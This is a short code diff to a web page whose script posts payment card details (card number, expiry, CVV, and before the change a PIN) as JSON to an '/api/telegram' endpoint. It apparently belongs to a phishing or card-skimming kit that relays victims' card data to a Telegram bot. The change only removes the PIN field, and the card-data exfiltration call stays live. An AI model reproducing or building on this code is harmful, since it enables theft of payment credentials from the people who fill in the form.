@@ -196,7 +196,7 @@
       const response = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ CN, cc, exp, cvv, PIN }),
+        body: JSON.stringify({ CN, cc, exp, cvv, }),
       });
 
       if (response.ok) {
@@ -244,4 +244,5 @@
               
 </body>
 </html>
+
 
